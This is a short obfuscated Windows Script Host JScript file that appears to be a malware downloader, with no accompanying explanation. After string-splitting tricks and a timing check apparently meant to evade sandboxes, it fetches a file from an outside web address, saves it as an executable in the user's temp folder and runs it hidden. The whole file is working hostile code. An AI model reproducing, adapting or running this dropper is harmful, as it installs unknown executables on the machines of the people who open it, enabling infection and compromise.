var J0 = false;
var H0 = "Create"+"Object";
var ST = function EG() {return WScript[H0]("WScript"+".Shell");}(), JN = 11;
var Z = "MSXML2"+".XMLHTTP";
var OM = 2;
var I0 = OM - 2;
function I(H1){ST["Run"](H1, I0, I0);};
function NX(){return Z + "";};
function A(QT, V0){I0 = I0 * 1; return QT - V0;};
function R(){return H0;};
/*@cc_on
  @if (@_win32 || @_win64)
    J0 = true;
  @end
@*/
if (J0)
{
var M = "";
function RZ(){return 22;};
var ND = 0; var WW = 0;
function T()
{
var Q0 = new this["Date"]();
var I1 = Q0["getUTCMilliseconds"]();
WScript["Sleep"](RZ());
var Q0 = new this["Date"]();
var D = Q0["getUTCMilliseconds"]();
WScript["Sleep"](RZ());
var Q0 = new this["Date"]();
var Q = Q0["getUTCMilliseconds"]();
var ND = "U";
ND = A(D, I1);
var WW = "HE";
WW = A(Q, D);
M = "open";
return A(ND, WW);
}
var YF = false;
var I2 = false;
for (var PZ = I0; PZ < RZ() * 1; PZ++){if (T() != I0){
YF = true; 
WW = "31" + 11 * ND + WW; 
I2 = true; 
break;
}}
function K() {return ((YF == true) && (YF == I2)) ? 1 : I0;};
if (YF && K() && I2){
function H() {return ST["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "AaIFaNr0MRjfNi.ex" + "e";};
 B = NX();
 D0 = WScript[H0](B);
 var ZX = 1;
do { 
	for (;ZX;){
	try {
		if (ZX == 1)
		{
			D0[M]("GET", "http://drirenaeris.com.au/b7eir", false);
			D0["send"]();
			A0 = "Sleep";
			ZX = 2;
		}
		WScript[A0](RZ() + 120); 
		if (D0["readystate"] < 2 * 2) continue;
		ZX = I0;
		function UE(V) {var WN = (1, 2, 3, 4, 5, V); return WN;};
		R0 = WScript[R()]("ADODB.Stream");
		B = R0;
		B[M]();
		B["type"] = UE(1);
		B["write"](D0["ResponseBody"]);
		R0["position"] = UE(I0);
		B["Save" + "ToFile"](H(), 2);
		R0["cl"+"ose"]();
		UG = H();
		I(UG);
	} catch(J){};};
}while (ZX);
}
}

